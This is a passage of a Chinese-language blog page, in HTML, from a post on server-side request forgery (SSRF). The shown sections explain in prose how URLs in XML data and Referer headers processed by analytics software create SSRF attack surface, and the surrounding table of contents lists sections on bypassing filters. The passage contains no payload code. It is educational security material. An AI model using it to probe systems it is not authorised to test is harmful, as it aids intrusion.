+<h5 id="URLs-within-data-formats"><a href="#URLs-within-data-formats" class="headerlink" title="URLs within data formats"></a>URLs within data formats</h5><p>有些格式规范允许包含数据解析器可能请求的URL，一些应用程序以其这种格式传输数据。一个明显的例子是XML数据格式，它在web应用程序中被广泛用于将结构化数据从客户端传输到服务器。当应用程序接受XML格式的数据并对其进行解析时，它可能会受到XXE注入的攻击，进而受到通过XXE进行SSRF的攻击。</p>
+<h5 id="SSRF-via-the-Referer-header"><a href="#SSRF-via-the-Referer-header" class="headerlink" title="SSRF via the Referer header"></a>SSRF via the Referer header</h5><p>一些应用程序使用追踪访问者的服务器端分析软件。 该软件经常在请求中记录 Referer 标头，因为这对于跟踪传入链接特别有用。 通常，分析软件实际上会访问 Referer 标头中出现的任何第三方 URL。 这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。 因此，Referer 标头通常代表 SSRF 漏洞的丰富攻击面。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-SSRF%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">What is SSRF？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-the-impact-of-SSRF-attacks"><span class="toc-number">2.</span> <span class="toc-text">What is the impact of SSRF attacks?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF-attacks-against-the-server-itself"><span class="toc-number">3.</span> <span class="toc-text">SSRF attacks against the server itself</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Example"><span class="toc-number">3.1.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF-attacks-against-other-back-end-systems"><span class="toc-number">4.</span> <span class="toc-text">SSRF attacks against other back-end systems</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Example-1"><span class="toc-number">4.1.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Circumventing-common-SSRF-defenses"><span class="toc-number">5.</span> <span class="toc-text">Circumventing common SSRF defenses</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF-with-blacklist-based-input-filters"><span class="toc-number">5.1.</span> <span class="toc-text">SSRF with blacklist-based input filters</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF-with-whitelist-based-input-filters"><span class="toc-number">5.2.</span> <span class="toc-text">SSRF with whitelist-based input filters</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Bypassing-SSRF-filters-via-open-redirection"><span class="toc-number">5.3.</span> <span class="toc-text">Bypassing SSRF filters via open redirection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Example-2"><span class="toc-number">5.4.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Blind-SSRF-vulnerabilities"><span class="toc-number">6.</span> <span class="toc-text">Blind SSRF vulnerabilities</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Finding-hidden-attack-surface-for-SSRF-vulnerabilities"><span class="toc-number">7.</span> <span class="toc-text">Finding hidden attack surface for SSRF vulnerabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Partial-URLs-in-requests"><span class="toc-number">7.1.</span> <span class="toc-text">Partial URLs in requests</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#URLs-within-data-formats"><span class="toc-number">7.2.</span> <span class="toc-text">URLs within data formats</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF-via-the-Referer-header"><span class="toc-number">7.3.</span> <span class="toc-text">SSRF via the Referer header</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&text=服务端请求伪造(SSRF)漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&title=服务端请求伪造(SSRF)漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&is_video=false&description=服务端请求伪造(SSRF)漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=服务端请求伪造(SSRF)漏洞&body=Check out this article: http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&title=服务端请求伪造(SSRF)漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&title=服务端请求伪造(SSRF)漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&title=服务端请求伪造(SSRF)漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&title=服务端请求伪造(SSRF)漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&name=服务端请求伪造(SSRF)漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/04/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%20(SSRF)%E6%BC%8F%E6%B4%9E/&t=服务端请求伪造(SSRF)漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
